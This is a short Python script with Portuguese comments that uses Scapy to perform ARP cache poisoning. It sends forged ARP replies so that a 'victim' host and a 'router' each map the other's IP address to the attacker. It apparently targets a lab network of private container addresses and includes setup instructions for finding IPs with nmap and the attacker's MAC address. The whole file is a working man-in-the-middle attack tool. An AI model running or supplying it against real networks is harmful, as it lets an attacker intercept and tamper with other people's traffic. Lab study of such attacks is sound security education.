# criar venv (opcional, mas recomendado) e instalar o scapy
# sudo apt-get scapy
# para rodar: sudo python3 scapy_test.py


from scapy.all import *

# Definir o endereço IP da vítima e do roteador
# Vítima = x-terminal
# Roteador = servidor
# Usar os IP'S encontrados usando nmap

victim_ip = "172.17.0.3"
router_ip = "172.17.0.2"

# Definir o endereço MAC do atacante
# Digitar no terminal : ip link show
# procurar o eth(caso esteja na rede cabeada) ou wlp (se estiver no wifi)
# Você vai ver algo parecido com isso
# 2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000
#    link/ether XX:XX:XX:XX:XX:XX brd ff:ff:ff:ff:ff:ff
# O endereço MAC é XX:XX:XX:XX:XX:XX.

attacker_mac = "a4:63:a1:6e:71:13"

# Definir o endereço MAC da vítima e do roteador
victim_mac = getmacbyip(victim_ip)
router_mac = getmacbyip(router_ip)

# Criar os pacotes ARP falsificados
victim_packet = ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac)
router_packet = ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac)

# Enviar os pacotes ARP falsificados
send(victim_packet)
send(router_packet)
